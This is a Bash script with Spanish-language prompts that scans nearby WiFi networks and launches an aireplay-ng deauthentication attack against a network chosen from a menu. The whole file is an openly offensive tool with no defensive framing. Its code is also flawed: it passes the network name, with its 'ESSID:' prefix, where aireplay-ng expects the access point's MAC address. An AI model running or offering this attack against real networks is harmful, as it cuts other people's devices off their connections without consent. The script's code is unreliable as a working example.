#!/bin/bash

# Constants
RED="\033[1;31m"
GREEN="\033[1;32m"  
WHITE="\033[1;37m"

# Get available WiFi networks
get_wifi_networks(){

  echo -e "${WHITE}Buscando redes WiFi disponibles...${GREEN}\n"

  networks=($(sudo iwlist wlan0 scan | grep ESSID | awk '{print $2}'))

  echo -e "${WHITE}Redes encontradas:\n"

  for ((i=0; i<${#networks[@]}; i++)); do
    echo -e "${RED}$i) ${networks[$i]}"
  done

}

# Deauth attack function
deauth_attack(){
  
  read -p "Ingresa el número de red a atacar: " target  
  ssid=${networks[target]}

  echo -e "\n${RED}Atacando red ${WHITE}$ssid ${RED}- Comenzando ataque Deauth...${WHITE}\n"

  timeout 60s aireplay-ng -0 0 -a $ssid wlan0

  echo -e "\n${RED}Ataque Deauth finalizado! ${WHITE}"
  
}

# Main menu
while :; do

    clear
    get_wifi_networks
    echo -e "\n1) Ataque Deauth a SSID"
    echo -e "2) Salir"
    read -p "Opción: " option

    case $option in
     1)
       deauth_attack
       ;;
     2) 
       exit 0 
       ;;
     *)
       echo -e "${RED}Opción inválida${WHITE}\n"
    esac

done
